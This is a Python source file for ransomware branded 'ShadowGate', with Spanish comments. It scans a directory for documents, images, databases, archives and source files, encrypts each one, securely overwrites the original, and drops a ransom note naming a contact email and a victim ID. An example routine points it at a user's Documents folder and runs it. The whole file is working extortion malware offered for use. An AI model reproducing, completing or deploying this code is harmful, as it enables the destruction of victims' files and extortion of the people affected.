import os
import hashlib
import time
try:
    from modules.encryption import SecureComs
except ImportError:
    from Objetivo.encryption import SecureComs

from Objetivo.utilities import log_action, secure_delete
from termcolor import colored


class Ransomware:
    def __init__(self, security_pin):
        self.security_pin = hashlib.sha256(security_pin.encode()).digest()
        self.crypto = SecureComs()
        self.extension = ".shadowlocked"
        self.locked = True
        self.encryption_count = 0

    def verify_pin(self, pin):
        """Verificar PIN de seguridad"""
        pin_hash = hashlib.sha256(pin.encode()).digest()
        if pin_hash == self.security_pin:
            self.locked = False
            return True
        return False

    def show_encryption_progress(self, file_path, success=True):
        """Mostrar progreso de encriptación en TU pantalla"""
        status = colored("ENCRYPTED #", 'green') if success else colored("FAILED", 'red')
        self.encryption_count += 1 if success else 0

        # Mostrar en tu consola
        print(f"[{self.encryption_count}] {file_path} {status}")

        # También registrar en log
        if success:
            log_action(f"Encrypted {file_path}", level="DEBUG")
        else:
            log_action(f"Failed to encrypt {file_path}", level="WARN")

    def show_summary(self, total_files, encrypted_files, failed_files):
        """Mostrar resumen final en TU pantalla"""
        print("\n" + "=" * 60)
        print(colored("ENCRYPTION SUMMARY", 'yellow', attrs=['bold']))
        print("=" * 60)
        print(f"Total files found:    {total_files}")
        print(f"Successfully encrypted: {colored(encrypted_files, 'green')}")
        print(f"Failed:               {colored(failed_files, 'red')}")
        print(f"Success rate:         {(encrypted_files / total_files * 100 if total_files > 0 else 0):.1f}%")
        print("=" * 60)

    def encrypt_file(self, file_path: str):
        """Cifrar archivo individual"""
        if self.locked:
            raise PermissionError("Ransomware locked - PIN required")

        try:
            # Obtener tamaño del archivo para mostrar info
            file_size = os.path.getsize(file_path)
            size_str = self._format_file_size(file_size)

            with open(file_path, 'rb') as f:
                original_data = f.read()

            encrypted_data = self.crypto.encrypt(original_data.decode('latin-1'), use_rsa=True)

            with open(file_path + self.extension, 'wb') as f:
                f.write(encrypted_data.encode())

            secure_delete(file_path, passes=35)

            # Mostrar éxito en TU pantalla
            self.show_encryption_progress(f"{file_path} ({size_str})", True)
            return True

        except Exception as e:
            # Mostrar error en TU pantalla
            self.show_encryption_progress(f"{file_path} - Error: {str(e)}", False)
            return False

    def _format_file_size(self, size_bytes):
        """Formatear tamaño de archivo para lectura humana"""
        if size_bytes == 0:
            return "0B"
        size_names = ["B", "KB", "MB", "GB"]
        i = 0
        while size_bytes >= 1024 and i < len(size_names) - 1:
            size_bytes /= 1024.0
            i += 1
        return f"{size_bytes:.1f}{size_names[i]}"

    def encrypt_directory(self, root_path: str, show_progress=True):
        """Cifrar directorio completo con visualización en TU pantalla"""
        if self.locked:
            raise PermissionError("Ransomware locked - PIN required")

        if not os.path.exists(root_path):
            log_action("Target path does not exist", target=root_path, level="WARN")
            return False

        encrypted_count = 0
        failed_count = 0
        total_count = 0

        # Extensiones objetivo para encriptar
        target_extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff',
            '.sql', '.mdb', '.db', '.accdb', '.csv',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.txt', '.rtf', '.md', '.html', '.xml', '.json',
            '.cpp', '.c', '.h', '.py', '.java', '.js', '.php'
        ]

        # Mostrar cabecera en TU pantalla
        if show_progress:
            print("\n" + "=" * 80)
            print(colored("SHADOWGATE ENCRYPTION PROGRESS", 'red', attrs=['bold']))
            print("=" * 80)
            print(f"Target: {root_path}")
            print(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            print("=" * 80)

        try:
            # Primero contar archivos para progreso
            if show_progress:
                print("Scanning files...")
                for root, _, files in os.walk(root_path):
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in target_extensions):
                            total_count += 1
                print(f"Found {total_count} files to encrypt")
                print("=" * 80)

            # Reiniciar contador
            self.encryption_count = 0
            current_file = 0

            # Ahora encriptar
            for root, _, files in os.walk(root_path):
                for file in files:
                    file_path = os.path.join(root, file)

                    if any(file.lower().endswith(ext) for ext in target_extensions):
                        current_file += 1

                        if show_progress:
                            # Mostrar barra de progreso
                            progress = (current_file / total_count) * 100
                            progress_bar = self._create_progress_bar(progress, 50)
                            print(f"\rProgress: [{progress_bar}] {progress:.1f}% ({current_file}/{total_count})",
                                  end="", flush=True)

                        if self.encrypt_file(file_path):
                            encrypted_count += 1
                        else:
                            failed_count += 1

            # Mostrar resumen final en TU pantalla
            if show_progress:
                print("\n")  # Nueva línea después de la barra de progreso
                self.show_summary(total_count, encrypted_count, failed_count)

            log_action(f"Encrypted {encrypted_count} files in {root_path}", level="INFO")
            return True

        except Exception as e:
            log_action(f"Directory encryption failed", details=str(e), level="CRIT")
            if show_progress:
                print(colored(f"\nERROR: {str(e)}", 'red'))
            return False

    def _create_progress_bar(self, progress, length=50):
        """Crear una barra de progreso visual"""
        filled_length = int(length * progress // 100)
        bar = '█' * filled_length + '░' * (length - filled_length)
        return bar

    def create_ransom_note(self, directory_path):
        """Crear nota de rescate en el directorio"""
        if self.locked:
            raise PermissionError("Ransomware locked - PIN required")

        ransom_text = f"""
        ⚠️⚠️⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️⚠️⚠️

        All your important files have been encrypted with military-grade encryption.

        To recover your files, you need the decryption key.

        Contact: shadowgate@protonmail.com
        Include this ID: {hashlib.md5(self.security_pin).hexdigest()[:16]}

        ⚠️ DO NOT TRY TO DECRYPT FILES YOURSELF - YOU MAY PERMANENTLY LOSE DATA ⚠️
        """

        note_path = os.path.join(directory_path, "!!!READ_ME!!!.txt")
        try:
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(ransom_text)
            log_action(f"Ransom note created at {note_path}", level="INFO")
            return True
        except Exception as e:
            log_action(f"Failed to create ransom note: {e}", level="WARN")
            return False

    def decrypt_file(self, file_path: str):
        """Descifrar archivo individual"""
        if self.locked:
            raise PermissionError("Ransomware locked - PIN required")

        try:
            if not file_path.endswith(self.extension):
                raise ValueError("Not a valid encrypted file")

            with open(file_path, 'r') as f:
                encrypted_data = f.read()

            decrypted_data = self.crypto.decrypt(encrypted_data, use_rsa=True)

            original_path = file_path[:-len(self.extension)]
            with open(original_path, 'wb') as f:
                f.write(decrypted_data.encode('latin-1'))

            secure_delete(file_path)

            # Mostrar éxito en descifrado
            print(f"[DECRYPTED] {original_path}")
            log_action(f"Decrypted {file_path}", level="INFO")
            return True

        except Exception as e:
            log_action(f"Decryption failed for {file_path}", details=str(e), level="WARN")
            return False


# Función de ejemplo de uso
def example_usage():
    """Ejemplo de cómo usar el ransomware con visualización"""
    # Inicializar con tu PIN secreto
    ransomware = Ransomware("1234567890")

    # Verificar PIN
    if ransomware.verify_pin("1234567890"):
        print(colored("✓ PIN verified successfully", 'green'))

        # Encriptar directorio con visualización
        target_directory = "C:\\Users\\TargetUser\\Documents"
        ransomware.encrypt_directory(target_directory, show_progress=True)

        # Crear nota de rescate
        ransomware.create_ransom_note(target_directory)

    else:
        print(colored("✗ Invalid PIN", 'red'))


if __name__ == "__main__":
    example_usage()